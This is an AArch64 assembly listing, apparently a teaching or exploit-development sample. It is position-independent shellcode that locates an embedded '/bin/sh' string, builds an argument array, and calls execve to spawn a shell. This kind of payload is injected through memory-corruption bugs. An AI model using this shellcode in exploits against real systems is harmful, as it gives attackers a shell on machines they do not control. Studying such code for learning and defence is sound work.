.section .text
.global _start

_start:
    b two
one:
    mov x19, x30

    mov x8,  8
    str x19, [x19, x8]   // save x19 to x19 + 8

    mov x8, 16
    mov x9, 0            // x9 = 0
    str x9, [x19, x8]    // save 0 to x19 + 16
    
execve: 
    mov  x0, x19         // x0 = x19
    adds x1, x19, 8      // x1 = x19 + 8
    mov  x2, xzr         // x2 = 0; xzr is the zero register
    mov  x8, 221         // x8 = 221: execve's system call number
    svc  0x1337          // Invoke execve()

two:
    bl one
    .ascii "/bin/sh"   
    .byte  0x00        
    .space 8, 0xAA     // Placeholder for argv[0]
    .space 8, 0xBB     // Placeholder for argv[1]

